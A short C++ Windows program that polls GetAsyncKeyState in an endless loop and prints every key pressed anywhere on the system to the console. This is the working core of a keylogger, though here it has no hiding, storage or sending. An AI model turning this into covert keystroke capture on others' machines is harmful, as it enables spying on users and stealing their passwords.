#include <iostream>
#include <Windows.h>

int main() {
    // Infinite loop to continuously capture keystrokes
    while (true) {
        // Check each key for its state (pressed or not pressed)
        for (int key = 8; key <= 255; key++) {
            // Check if the key is pressed
            if (GetAsyncKeyState(key) & 0x8000) {
                // Log the pressed key to the console
                std::cout << "Key pressed: " << key << std::endl;

                // Log the character corresponding to the key
                char character = MapVirtualKey(key, MAPVK_VK_TO_CHAR);
                std::cout << "Character: " << character << std::endl;
            }
        }

        // Add a delay to avoid high CPU usage
        Sleep(100);
    }

    return 0;
}
